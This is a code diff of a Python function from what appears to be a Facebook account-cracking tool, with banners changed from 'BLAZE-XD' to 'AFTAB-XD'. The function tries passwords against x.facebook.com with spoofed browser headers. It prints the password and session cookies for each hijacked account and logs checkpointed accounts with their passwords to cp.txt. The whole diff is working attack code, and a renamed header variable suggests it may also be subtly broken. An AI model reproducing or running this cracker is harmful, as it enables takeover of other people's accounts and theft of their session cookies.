@@ -810,7 +810,7 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			headers = {
+			hheader_freefb = {		
     'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -831,8 +831,7 @@ def rcrack(uid,pwx,tl):
     'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-
-                if 'c_user' in log_cookies:
+			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\033[1;92m[BLAZE-Ok] '+cid+' | '+ps+'\n\033[0;92m[•] COOKIES : '+coki+'\x1b[1;97m')
@@ -843,13 +842,13 @@ def rcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\033[1;96m[BLAZE-CP] '+cid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(uid+'  | '+ps+'\n')
+				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\033[1;97m[BLAZE-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
+		sys.stdout.write('\r\033[1;97m[AFTAB-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
